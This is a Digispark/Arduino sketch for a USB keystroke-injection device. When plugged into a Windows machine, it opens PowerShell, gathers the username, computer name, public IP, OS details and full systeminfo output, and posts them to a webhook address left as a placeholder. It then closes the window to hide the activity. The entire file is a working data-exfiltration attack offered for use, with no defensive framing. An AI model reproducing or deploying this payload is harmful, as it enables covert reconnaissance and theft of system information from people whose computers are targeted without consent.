#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(3000);  // Wait after USB plug
  DigiKeyboard.sendKeyStroke(0);  // Wake
  DigiKeyboard.delay(500);

  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);

  // Launch PowerShell
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5500);

  // Setup webhook
  DigiKeyboard.print("$w='YOUR WEBHOOK SITE URL HERE';");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Grab IP address
  DigiKeyboard.print("$ip=(iwr ifconfig.me/ip -UseBasicParsing).Content.Trim();");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Grab OS info
  DigiKeyboard.print("$os=(Get-CimInstance Win32_OperatingSystem).Caption;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Grab system time
  DigiKeyboard.print("$t=(Get-Date).ToString();");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Grab systeminfo (slow but complete)
  DigiKeyboard.print("$sysinfo=(systeminfo | Out-String);");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);  // wait longer due to systeminfo delay

  // Compose message
  DigiKeyboard.print("$s=\"User:$env:USERNAME`nPC:$env:COMPUTERNAME`nIP:$ip`nOS:$os`nTime:$t`n`nSystemInfo:`n$sysinfo\";");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Send via POST
  DigiKeyboard.print("irm -Uri $w -Method Post -Body @{content=$s}");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  // Close window
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}

void loop() {}
